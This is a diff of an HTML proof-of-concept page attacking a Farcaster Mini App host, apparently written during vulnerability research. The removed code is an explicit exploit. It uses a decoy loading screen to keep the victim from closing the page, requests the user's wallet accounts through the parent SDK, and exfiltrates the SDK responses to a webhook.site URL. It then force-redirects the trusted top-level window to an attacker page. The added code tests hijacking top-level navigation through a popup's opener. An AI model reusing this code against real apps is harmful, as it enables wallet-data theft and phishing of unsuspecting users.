@@ -2,108 +2,59 @@
 <html>
 	<head>
 		<meta charset="utf-8" />
-		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<title>Farcaster Mini App</title>
-		<style>
-			body {
-				font-family: -apple-system, sans-serif;
-				background: #17101f;
-				color: #fff;
-				padding: 20px;
-				text-align: center;
-			}
-			.loading {
-				margin-top: 40px;
-				font-size: 18px;
-			}
-			.spinner {
-				width: 40px;
-				height: 40px;
-				margin: 20px auto;
-				border: 3px solid rgba(255, 255, 255, 0.1);
-				border-top: 3px solid #8b5cf6;
-				border-radius: 50%;
-				animation: spin 1s linear infinite;
-			}
-			@keyframes spin {
-				to {
-					transform: rotate(360deg);
-				}
-			}
-		</style>
+		<title>PoC</title>
 	</head>
-	<body>
-		<!-- This looks like a loading screen so victim doesn't close it -->
-		<div class="spinner"></div>
-		<div class="loading">Loading mini app...</div>
-
-		<!-- Hidden form that navigates top frame -->
-		<form id="redirect" action="https://example.com" method="GET" target="_top" style="display: none"></form>
-
+	<body style="background: #17101f; color: #fff; font-family: sans-serif; padding: 20px">
+		<h2>Farcaster Mini App PoC</h2>
+		<button id="test" style="padding: 20px 40px; font-size: 20px; background: #dc2626; color: white; border: none; border-radius: 8px; cursor: pointer">Click to Continue</button>
+		<pre id="log">Ready...</pre>
 		<script>
-			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
-			var msgCounter = 7000;
-
-			function wireRaw(val) {
-				return [{ type: "RAW", value: val }];
+			var logEl = document.getElementById("log");
+			function log(msg) {
+				logEl.textContent += "\n" + msg;
 			}
 
-			function call(method, wireArgs) {
-				var id = msgCounter++;
-				window.parent.postMessage(
-					{
-						id: id,
-						type: "APPLY",
-						path: [method],
-						argumentList: wireArgs || [{ type: "RAW", value: {} }],
-					},
-					"*",
-				);
-				return id;
-			}
-
-			function sendToWebhook(label, data) {
-				try {
-					fetch(WEBHOOK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain" }, body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }) });
-				} catch (e) {}
-			}
-
-			// Listen for SDK responses
-			window.addEventListener("message", function (event) {
-				if (event.data && event.data.value) {
-					sendToWebhook("SDK_RESPONSE", event.data);
+			window.addEventListener("message", function (e) {
+				if (e.data && e.data.id >= 100) {
+					log("Response: " + JSON.stringify(e.data).slice(0, 200));
 				}
 			});
 
-			// Step 1: Initialize SDK (1s)
+			// Ready on load
 			setTimeout(function () {
-				call("ready", wireRaw({}));
+				window.parent.postMessage({ id: 100, type: "APPLY", path: ["ready"], argumentList: [{ type: "RAW", value: {} }] }, "*");
+				log("SDK ready sent");
 			}, 1000);
 
-			// Step 2: Extract wallet address (3s)
-			setTimeout(function () {
-				call(
-					"ethProviderRequestV2",
-					wireRaw({
-						jsonrpc: "2.0",
-						id: 1,
-						method: "eth_requestAccounts",
-						params: [],
-					}),
-				);
-			}, 3000);
-
-			// Step 3: Exfiltrate any received wallet data
-			setTimeout(function () {
-				sendToWebhook("EXFIL_COMPLETE", { note: "Data sent, redirecting victim" });
-			}, 5000);
-
-			// Step 4: REDIRECT TOP-LEVEL WINDOW (6s)
-			// This is the critical part — navigates farcaster.xyz itself
-			// The user clicked a trusted farcaster.xyz link but ends up on attacker site
-			setTimeout(function () {
-				document.getElementById("redirect").submit();
-			}, 6000);
+			// The actual popup test — on real button click
+			document.getElementById("test").addEventListener("click", function () {
+				log("Opening popup...");
+				var popup = window.open("about:blank");
+				if (popup) {
+					log("POPUP OPENED!");
+					try {
+						popup.document.write(
+							'<pre id="r">Testing...</pre>' +
+								"<scr" +
+								"ipt>" +
+								'var r = document.getElementById("r");' +
+								"var lines = [];" +
+								'try { lines.push("opener: " + !!opener); } catch(e) { lines.push("opener err: " + e.message); }' +
+								'try { lines.push("opener.top: " + !!opener.top); } catch(e) { lines.push("opener.top err: " + e.message); }' +
+								'try { lines.push("top href: " + opener.top.location.href); } catch(e) { lines.push("top href err: " + e.message); }' +
+								'try { opener.top.location = "https://example.com"; lines.push("TOP NAV: WORKED!!!"); } catch(e) { lines.push("TOP NAV err: " + e.message); }' +
+								'r.textContent = lines.join("\\n");' +
+								"</scr" +
+								"ipt>",
+						);
+						popup.document.close();
+					} catch (e) {
+						log("Write error: " + e.message);
+					}
+				} else {
+					log("Popup blocked");
+				}
+			});
 		</script>
 	</body>
 </html>
